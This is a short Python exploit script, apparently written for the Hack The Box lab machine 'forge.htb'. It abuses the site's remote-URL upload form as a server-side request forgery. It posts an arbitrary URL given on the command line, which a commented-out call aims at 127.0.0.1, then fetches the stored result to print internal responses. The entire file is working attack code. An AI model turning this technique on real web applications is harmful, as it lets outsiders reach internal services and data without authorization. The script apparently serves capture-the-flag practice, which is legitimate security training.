import re
import sys
import html
import requests as r

url = 'http://forge.htb/upload'


def ssrf(ssrf_url):
    data = {'url': f'http://{ssrf_url}', 'remote': 1}
    rspn = r.post(url, data=data)
    if 'File uploaded successfully' in rspn.text:
        ssrf_rspn_file = re.findall(r'href="(.*?)"', rspn.text)[4]
        ssrf_rspn = r.get(ssrf_rspn_file)
        print(ssrf_rspn.text)
    else:
        error = re.findall(r'<strong>(.*?)</strong>', rspn.text)[0]
        print(html.unescape(error))


# ssrf('127.0.0.1')
ssrf(sys.argv[1])
